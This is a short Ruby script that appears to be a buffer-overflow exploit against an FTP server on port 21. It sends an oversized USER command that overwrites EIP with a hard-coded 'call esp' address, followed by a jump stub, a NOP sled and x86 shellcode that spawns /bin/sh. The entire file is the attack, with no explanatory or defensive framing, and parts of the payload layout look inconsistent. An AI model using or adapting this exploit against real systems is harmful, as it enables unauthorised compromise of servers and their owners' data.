require 'socket'

host = "192.168.0.100"
port = 21

# Shellcode
shellcode = "\x90" * 20
shellcode += "\x31\xc0\x50\x68//sh\x68/bin"
shellcode += "\x89\xe3\x50\x53\x89\xe1\x99\xb0"
shellcode += "\x0b\xcd\x80"

# Create buffer with EIP overwrite
buf = "USER " + "A" * 485
buf += "\x97\x45\x13\x08"  # Overwrite EIP with address of "call esp" instruction
buf += "\x83\xc0\x0c\xff\xe0\x90\x90"  # Add jump to shellcode and NOP sled
buf += shellcode

# Create socket connection
s = TCPSocket.new(host, port)

# Send buffer
s.puts(buf)

# Close socket connection
s.close()
